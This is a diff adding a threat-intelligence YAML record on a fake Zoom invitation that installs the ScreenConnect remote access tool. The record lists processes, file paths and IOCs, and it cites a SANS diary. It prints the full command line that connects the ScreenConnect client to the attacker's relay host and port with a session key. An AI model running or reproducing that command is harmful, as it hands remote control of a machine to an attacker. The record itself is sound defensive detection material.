@@ -1,0 +1,25 @@
+description: A user received a fake Zoom meeting invitation email containing a malicious Session.ClientSetup.exe downloader that installs ScreenConnect, a remote access tool.
+attribution: Unknown
+malware_families:
+- ScreenConnect
+TTPs:
+  processes:
+  - msiexec.exe
+  - ScreenConnect.ClientService.exe
+  commandline:
+  - 'C:\Users\admin\AppData\Local\Temp\ScreenConnect\25.2.4.9229\84cae30d9bf18843\ScreenConnect.ClientSetup.msi'
+  - '"C:\Windows\System32\msiexec.exe" /i "C:\Users\admin\AppData\Local\Temp\ScreenConnect\25.2.4.9229\84cae30d9bf18843\ScreenConnect.ClientSetup.msi"'
+  - '"C:\Program Files (x86)\ScreenConnect Client (84cae30d9bf18843)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=tqtw21aa.anondns.net&p=8041&s=6c9715c2-054f-49cc-b888-4084388fc1c5&k=BgIAAACkAABSU0ExAAgAAAEAAQC9dnuqTcFjsgNQridID1kdRpR1VfdwtJjAbZxJ7OqFEjxozVJJ4Fk%2f6wGXUk5FLry2iN4xJDNUkf936O5CbriOKbT5HTkP0KzDmnvehBgv0%2b2%2fHQKELyECMoUtB30UYsSUj%2fyrCMsNLX4BcMNVuQbCBHZX7joQ15PIeSAzEA1ZNI9h8q2Toz7hToU1Rv9kyNBeIoulf9o%2f3FFzBoJYcABIvPgkJu8DHWjJdqR30nYdCT7iJadZIr62PCaEcStVmdD7YDMjizQar9ehuiswtnWKYu9AwCiNiEbNKlW8ymbGR5nI4sfqkAaPoz%2fnP8rmoIeBiy7fzYg3rl7nKjwzPqCw&c=&c=&c=XigRocky&c=&c=&c=&c=&c="'
+  file_activity:
+  - C:\\Users\\admin\\AppData\\Local\\Temp\\ScreenConnect\\25.2.4.9229\\84cae30d9bf18843\\ScreenConnect.ClientSetup.msi
+  - C:\\Program Files (x86)\\ScreenConnect Client (84cae30d9bf18843)\\ScreenConnect.ClientService.exe
+IOCs:
+- hash: f5e467939f8367d084154e1fefc87203e26ec711dbfa83217308e4f2be9d58be
+- ip: 151.242.63.139
+- domain: tqtw21aa.anondns.net
+- port: '8041'
+authors:
+- Xavier Mertens
+reference: https://isc.sans.edu/diary/Be+Careful+With+Fake+Zoom+Client+Downloads/32014/#comments
+date_of_publication: June 05, 2025
+file_creation_date: June 05, 2025
